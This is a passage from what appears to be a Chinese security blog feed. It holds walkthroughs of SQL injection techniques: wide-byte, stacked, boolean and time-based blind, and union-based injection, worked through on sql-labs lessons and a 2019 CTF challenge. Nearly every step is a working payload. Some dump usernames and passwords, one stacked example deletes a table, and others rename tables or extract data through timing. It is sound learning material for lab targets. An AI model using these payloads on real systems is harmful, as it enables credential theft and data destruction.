0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    &#123;      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      &#125;&#125;    else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;                ?&gt;</code></pre><p>普通注入</p><pre><code>?id=1&#39;</code></pre><p><img src="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20230521112543826.png" alt="image-20230521112543826"></p><p>第一步：被check_addslashes函数转义</p><p><code>check_addslashes</code> 函数并不是完全安全的，因为它只是简单地添加反斜杠来转义特殊字符。</p><p>第二步：在执行sql查询之前，mysql_query(“SET NAMES gbk”);将MySQL的三个字符集设置为 gbk 编码</p><p>第三步：character_set_client告诉MySQL Server，传入的是gbk编码，也就是’被当做了%5C%27传入</p><p>第四步：character_set_client –&gt;character_set_connection编码完全一致，数据没有任何转换，所以输入是%5C%27,输出的是%5%27</p><p>第五步：character_set_connection  –&gt;table charset这里我们需要关注下使用的表的字符集。</p><p><img src="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/image-20230521203503187.png" alt="image-20230521203503187"></p><p>可以看到id参数没有设置编码方式，不会对%5C%27进行处理。在这里mysql服务器将查询语句执行，并返回结果。</p><p>执行的sql语句为：</p><p>$sql=“SELECT * FROM users WHERE id=‘1’’ LIMIT 0,1”;<br> ‘被转义无法进行注入</p><p>第六步：table charset –&gt;character_set_results字符集也设定为gbk，保证了输出内容没有乱码。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>堆叠注入</title>
      <link href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>mysql数据库sql语句的默认结尾是以 <strong>;</strong> 结尾，在执行多条sql语句时要使用结束符隔开，那么在 <strong>；</strong>结束一条sql语句后继续构造下一条语句会不会一起执行？因此这个想法就造成了堆叠注入。</p><p>而union injection(联合注入)也是将两条语句合并在一起，两者有什么区别嘛？</p><p>区别就在于union或者union all 执行的语句类型有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><pre><code>用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</code></pre><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1.先判断注入类型</p><pre><code>1</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202114862.png" alt="image-20230516202114862"></p><p>正常显示，再试试别的</p><pre><code>1&#39;</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202210837.png" alt="image-20230516202210837"></p><p>出现错误，说明存在注入，看一下报错信息，没有显示有用的信息，在试试万能注入</p><pre><code>1&#39; or 1=1;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516202509807.png" alt="image-20230516202509807"></p><p>2.可以判断一下字段数</p><pre><code>1&#39; order by 3#    </code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516203725859.png" alt="image-20230516203725859"></p><pre><code>1&#39; order by 2#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204018371.png" alt="image-20230516204018371"></p><p>说明字段数为2</p><p>然后我们尝试一下用联合注入看一下</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516204230761.png" alt="image-20230516204230761"></p><p>perg_math函数是正则函数，从报错信息我们发现select被正则匹配过滤掉了</p><p>我们再试试别的方法</p><p>3.查看数据库</p><pre><code>1&#39;;show databases;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516205244193.png" alt="image-20230516205244193"></p><p>执行上面的语句，我们发现第一句满足条件的语句之后，还能在执行下一条，没有条件限制</p><p>4.查看表名</p><pre><code>1&#39;;show tables from supersqli;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210127648.png" alt="image-20230516210127648"></p><p><strong>注意：如果查看的表名是字符串，就需要加上反引号(`),英文输入法下按esc下面那个键</strong></p><p>查看字符串表中的数据</p><pre><code>1&#39;;use supersqli;show columns from `1919810931114514`;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516210857498.png" alt="image-20230516210857498"></p><p>再查看words表看看</p><pre><code>1&#39;;use supersqli;show columns from words;#</code></pre><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516211257044.png" alt="image-20230516211257044"></p><p>varchar()是一种比char灵活的数据类型，是可以保存可变长的字符串</p><p>根据两个表的情况结合实际查询出结果,判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构也是id（数字）和data（字符串），查询传入参数也就是赋值给了id</p><h2 id="rename和alert用法"><a href="#rename和alert用法" class="headerlink" title="rename和alert用法"></a>rename和alert用法</h2><p>rename：修改一个或者多个表的名称</p><pre><code>rename table old_table_name to new_table_name;</code></pre><p>alter :向表中添加字段</p><pre><code>alter table [表名] add [列名] 类型</code></pre><p>保留old和new列名</p><pre><code>列名：a ----&gt;b 列类型     alter table t1 change a b integer;</code></pre><p>改名</p><pre><code>1&#39;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);show tables;#</code></pre><p>更改表名列名</p><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214010853.png" alt="image-20230516214010853"></p><p>最后用</p><pre><code>1&#39; and 1=1#</code></pre><p>看回显数据</p><p><img src="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20230516214204616.png" alt="image-20230516214204616"></p><p>得到flag</p><p>这个大佬的wp不错！！！</p><p><a href="https://ttoc.fun/2022/06/21/buuctf-wp/">https://ttoc.fun/2022/06/21/buuctf-wp/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布尔盲注和时间盲注</title>
      <link href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是盲注"><a href="#什么是盲注" class="headerlink" title="什么是盲注"></a>什么是盲注</h2><p>盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站方法代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断过程称为盲注。</p><p>简单理解就是在前端页面没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的，这个时候我们需要使用页面的正常和不正常显示来进行sql注入。</p><h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>布尔盲注</p><p>时间盲注</p><h2 id="利用盲注的前提条件"><a href="#利用盲注的前提条件" class="headerlink" title="利用盲注的前提条件"></a>利用盲注的前提条件</h2><p>首先页面没有显示位（如果有显示位可以选择union联合查询），并且没有返回sql语句的执行错误信息。</p><h2 id="盲注的优缺点"><a href="#盲注的优缺点" class="headerlink" title="盲注的优缺点"></a>盲注的优缺点</h2><p>优点：不需要显示位和出错信息。</p><p>缺点：速度慢，耗费时间长（可以使用bp等工具）</p><h2 id="布尔类型的盲注"><a href="#布尔类型的盲注" class="headerlink" title="布尔类型的盲注"></a>布尔类型的盲注</h2><ol><li>left(database(),1)&gt;’s’     //left() 函数</li></ol><p>database()显示数据库名称，left(a,b)从左侧截取a的前b位</p><ol start="2"><li> ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1 ),1,1))=101 –+          //substr()函数，ascii函数()</li></ol><p>   substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值</p><ol start="3"><li><p>ascii(substr((select database()),1,1))=98</p></li><li><p>ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23           //ord()函数，mid()函数</p><p>mid(a,b,c)从位置b开始，截取a字符串的c位</p><p>ord()函数同ascii(),将字符转为ascii值</p></li><li><p>regexp正则注入</p><p>用法介绍：select user() regexp ‘^[a-z]’;</p><p>正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’ 来进行。</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514160206799.png" alt="image-20230514160206799"></p></li></ol><p>当正确的时候显示结果为1，不正确的时候显示结果为0</p><p>6.like匹配注入</p><p>和上述的正则类似，mysql在匹配的时候我们可以用like 进行匹配。</p><p>用法：select user()  like ‘ro%’</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514163811743.png" alt="image-20230514163811743"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5)%23)    //if判断语句，条件为假，条件为假，执行sleep</p><p>union select if(substring(current,1,1)=char(119),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null)  </p><p>from (select database() as current) as tbl;</p><p>//benchmark(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源。</p><p><img src="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/image-20230514173225035.png" alt="image-20230514173225035"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场</title>
      <link href="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="几个常用函数"><a href="#几个常用函数" class="headerlink" title="几个常用函数"></a>几个常用函数</h3><pre><code>1.version() --mysql版本2.user()    --数据库用户名3.database() --数据库名4.@@datadir  --数据库路径5.@@version_compile_os --操作系统</code></pre><h3 id="用于尝试的闭合语句"><a href="#用于尝试的闭合语句" class="headerlink" title="用于尝试的闭合语句"></a>用于尝试的闭合语句</h3><p>–+可以用 #替换，url提交过程中url编码后的#为%23， - 和# 为注释符，把后面语句注释掉，使其无法执行。空格url转义成%20，  ‘ 转义成%27</p><p>有时用–+，而不是#的原因是,http 无法解释#，所以用–+来代替</p><p>–+中起到注释作用其实是–，但是如果单纯的 – 会和后面的内容连上从而导致sql语句出错，所以有了 + 会解释为空格，从而避免报错</p><p>故</p><p>–%20 &lt;==&gt; –+</p><h4 id="sql-labs靶场less1"><a href="#sql-labs靶场less1" class="headerlink" title="sql-labs靶场less1"></a>sql-labs靶场less1</h4><p>1.题目提示输入ID进行get传参，但需要注意的是这个靶场貌似是不区分大小写的，我用大写ID进行传参是没有任何回显的，只有输入id才可以传参，这点需要注意。</p><p>‘ 报错</p><pre><code>#尝试单引号注入，看回显信息；发现是字符型后台数据库通过单引号进行闭合?id=1&#39; </code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211409346.png" alt="image-20230717211409346"></p><p>2.尝试使用 # 注释不起作用。采用%23或者–+注释都可以，需要注意</p><pre><code>?id=1&#39;  --+?id=1&#39; #</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211829588.png" alt="image-20230717211829588"></p><p>3.进一步尝试 输入 id=1’ –+ 发现回显正常</p><pre><code>?id=1&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718204259099.png" alt="image-20230718204259099"></p><p>4.用order by 判断该语句有几列数据 ?id=1’ order by 3 –+<br> order by 3 回显正常 order by 4 显示错误 证明有三列数据</p><pre><code>?id=1&#39; order by 3 --+  正常?id=1&#39; order by 4 --+  报错</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205559129.png" alt="image-20230718205559129"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205438777.png" alt="image-20230718205438777"></p><p>5.于是使用 函数查询，此时要将id=1改为一个数据库不存在的数值 比如-1，给后面查询语句留显示位。此时注入语句为： </p><pre><code>?id=-1&#39; union select 1,2,3 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205841661.png" alt="image-20230718205841661"></p><p>如图可知显示位为2，3位。</p><p>6.然后在2，3位选择一位或者两位 查询数据库<br> 首先查询数据库名称<br> 查询语句：</p><pre><code>?id=-1’ union select 1,2,database() --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718210316321.png" alt="image-20230718210316321"></p><p>可以查看到 数据库名称为security</p><p>7.继续查看表名</p><p>通过group_concat函数开始手工报他的表名；看看数据库中都有哪些表</p><h6 id="information-schema-tables-表示元数据下的tables表"><a href="#information-schema-tables-表示元数据下的tables表" class="headerlink" title="information_schema.tables 表示元数据下的tables表"></a>information_schema.tables 表示元数据下的tables表</h6><h6 id="where-条件"><a href="#where-条件" class="headerlink" title="where+条件"></a>where+条件</h6><h6 id="group-concat-table-name-表示将查询到的结果连接起来"><a href="#group-concat-table-name-表示将查询到的结果连接起来" class="headerlink" title="group_concat(table_name)表示将查询到的结果连接起来"></a>group_concat(table_name)表示将查询到的结果连接起来</h6><h6 id="下方payload的意思是：查询information-schema数据库下的tables表且table-schema字段内容是security的所有table-name的内容"><a href="#下方payload的意思是：查询information-schema数据库下的tables表且table-schema字段内容是security的所有table-name的内容" class="headerlink" title="下方payload的意思是：查询information)_schema数据库下的tables表且table_schema字段内容是security的所有table_name的内容"></a>下方payload的意思是：查询information)_schema数据库下的tables表且table_schema字段内容是security的所有table_name的内容</h6><pre><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212438030.png" alt="image-20230718212438030"></p><p> 可以见到表名有emails,referers,uagents,users</p><p>8.因为sql注入主要是查看数据库中有用信息，而这个users 这个表 看起来存有敏感信息，于是我们继续查看users 表中信息。查看users表中的列名。</p><pre><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name =&#39;users&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212951955.png" alt="image-20230718212951955"></p><p>可以查看到user中有三个列名id 、username、password</p><p>9.最后查找该表中usename、password的值</p><pre><code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718213610162.png" alt="image-20230718213610162"></p><p>得到所有的数据，注入完成</p><h4 id="sql-labs靶场less2"><a href="#sql-labs靶场less2" class="headerlink" title="sql-labs靶场less2"></a>sql-labs靶场less2</h4><p>tips：可以打开每一关的源码，在该位置添加一句代码方便做题分析，</p><pre><code>echo&quot;sql里面执行的是&quot;.$sql.&quot;&lt;br&gt;&quot;;</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225159607.png" alt="image-20230512225159607"></p><p>1.判断注入类型</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225353576.png" alt="image-20230512225353576"></p><p>可以知道是数值型</p><p>2.判断字段数</p><pre><code>?id=1 order by 4 不正常?id=1 order by 3 正常</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225530782.png" alt="image-20230512225530782"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225927074.png" alt="image-20230512225927074"></p><p>可以确定有三列</p><p>3.判断可以回显的字段数</p><pre><code>?id=-1 union select 1,2,3</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513193541123.png" alt="image-20230513193541123"></p><p>4.判断数据库名和版本</p><pre><code>?id=-1 union select 1,database(),version()</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513194524358.png" alt="image-20230513194524358"></p><p>5.获取表名</p><pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195104430.png" alt="image-20230513195104430"></p><p>6.获取列名</p><pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195526249.png" alt="image-20230513195526249"></p><p>7.获取数据</p><pre><code>?id=-1 union select 1,username,password from security.users limit 0,1 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195823876.png" alt="image-20230513195823876"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195921714.png" alt="image-20230513195921714"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513200006154.png" alt="image-20230513200006154"></p><p>第n条…..依次类推limit n，1</p><h4 id="sql-labs靶场less3"><a href="#sql-labs靶场less3" class="headerlink" title="sql-labs靶场less3"></a>sql-labs靶场less3</h4><p>今天浅浅复习一下</p><p>1.判断注入点，</p><p>输入？id=1 显示正常 </p><p>​     ？id=1’ 不正常  说明存在注入</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513221043279.png" alt="image-20230513221043279"></p><p>上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合</p><pre><code>?id=1&#39;) union select 1 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224322394.png" alt="image-20230513224322394"></p><p>上面图片显示列数不正确，盲猜试试三列</p><p>2.判断字段数</p><pre><code>?id=1&#39;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224510771.png" alt="image-20230513224510771"></p><p>字段数为4时报错，说明字段数为3</p><p>3.判断回显</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224733973.png" alt="image-20230513224733973"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&#39;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224934066.png" alt="image-20230513224934066"></p><p>5.查看数据库名称</p><pre><code>?id=-1&#39;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513230621168.png" alt="image-20230513230621168"></p><p>6.查看security库里面的表名</p><pre><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231141345.png" alt="image-20230513231141345"></p><p>7.获取列名</p><pre><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231403867.png" alt="image-20230513231403867"></p><p>8.字段数据</p><p>获取到字段后，根据字段获取表里的数据。字段名之间再加上*字符的十六进制，可以把账号密码隔开，容易区分</p><pre><code>?id=-1&#39;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231622174.png" alt="image-20230513231622174"></p><p>完成！！！</p><h4 id="sql-labs靶场less4"><a href="#sql-labs靶场less4" class="headerlink" title="sql-labs靶场less4"></a>sql-labs靶场less4</h4><p>在复习一下less4</p><p>less-3是单引号+右括号，less-4是双引号+右括号</p><p>1.判断注入点</p><p>一开始，？id=1 直接回显用户名和密码，</p><p>​              ？id=1’ 也是直接回显用户名和密码</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513235842630.png" alt="image-20230513235842630"></p><p>在尝试一下别的符号</p><p>?id=1”  出现报错信息</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000027873.png" alt="image-20230514000027873"></p><p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p><p>2.查字段名</p><p>输入</p><pre><code>?id=1&quot;) order by 4 --+</code></pre><p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000300269.png" alt="image-20230514000300269"></p><p>3.查输出列的位置</p><pre><code>?id=-1&quot;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000817750.png" alt="image-20230514000817750"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&quot;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001038494.png" alt="image-20230514001038494"></p><p>5.查看当前数据库下的表</p><pre><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001411510.png" alt="image-20230514001411510"></p><p>6.查看user表下面的字段信息</p><pre><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001554807.png" alt="image-20230514001554807"></p><p>7.查看字段数据</p><pre><code>?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001730590.png" alt="image-20230514001730590"></p><p>完成！！！！！！</p><h4 id="sql-labs靶场less6"><a href="#sql-labs靶场less6" class="headerlink" title="sql-labs靶场less6"></a>sql-labs靶场less6</h4><p>1.判断注入点（双引号注入）</p><pre><code>?id=1&quot; and 1 --a   页面显示正常</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514203911904.png" alt="image-20230514203911904"></p><pre><code>?id=1&quot; and 0 -- a   页面异常（空显示）</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514205048775.png" alt="image-20230514205048775"></p><p>2.判断字符长度</p><p>判断当前使用的数据库长度是否大于1</p><pre><code>?id=1&quot; and length(database())=8 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514221524192.png" alt="image-20230514221524192"></p><p>3.穷举字符</p><p>判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入</p><pre><code>?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a</code></pre><pre><code>?id=1&quot; and left(database(),1)=&#39;s&#39; --+用穷举的方法一个个列出来，....效率有点慢了</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514222128909.png" alt="image-20230514222128909"></p><pre><code>?id=1&quot; and left(database(),8)=&#39;security&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514225957158.png" alt="image-20230514225957158"></p><p>4.判断库中每个表名的长度</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232750125.png" alt="image-20230514232750125"></p><p>第一个表的长度是6</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232933832.png" alt="image-20230514232933832"></p><p>第二个表的长度为8</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233146882.png" alt="image-20230514233146882"></p><p>第三个表的长度为7</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233314642.png" alt="image-20230514233314642"></p><p>第四个表的长度为5</p><p>5.爆破表名</p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233558822.png" alt="image-20230514233558822"></p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233732069.png" alt="image-20230514233732069"></p><p>查看ascii表101是e，第一个表开头字母是e</p><p>…..此处省略一些步骤</p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514234142010.png" alt="image-20230514234142010"></p><p>查看ascii表115是u，第一个表开头字母是u</p><p>….表名是users</p><h4 id="sql-labs靶场less7"><a href="#sql-labs靶场less7" class="headerlink" title="sql-labs靶场less7"></a>sql-labs靶场less7</h4><p>打开题目</p><p>1.判断是否是数字型传参</p><p>2.判断是否有单引号闭合</p><p>3.判断是否有双引号闭合</p><p>4.判断是否单引号+括号闭合</p><p>5.判断是否是双引号+括号闭合</p><p>如果以上都不是，那以上规则都同时加上sleep测试一遍，看是不是存在延时注入</p><p>先传入id=1试试呢</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210605853.png" alt="image-20230719210605853"></p><p>1.判断注入类型</p><pre><code>?id=1&#39;    报错</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210730863.png" alt="image-20230719210730863"></p><p>输入单引号之后，页面报错，试试双引号</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210918196.png" alt="image-20230719210918196"></p><p>select * from users where id=’1”‘会正确执行的</p><p>所以这里判断可能为单引号闭合字符型注入</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719211628016.png" alt="image-20230719211628016"></p><p>变为单引号之后页面还是报错，说明闭合不仅仅是单引号，可能还有其它字符，可能为<code>)</code>    )的个数也不确定</p><p>因为当输入select * from users  where id=(‘1’)时其实是可以正确执行的</p><p>先试试一个的吧</p><pre><code>?id=1&#39;) --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719213838371.png" alt="image-20230719213838371"></p><p>一个）还是报错，试试两个</p><pre><code>?id=1&#39;))  --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214110969.png" alt="image-20230719214110969"></p><p>页面正常显示了！！！说明闭合方式是’))</p><p>可以进行正常的注入其他语句。</p><p>2.先判断字段数</p><pre><code>?id=1&#39;)) order by 3 --+   正常?id=1&#39;)) order by 4 --+   错误</code></pre><p><img 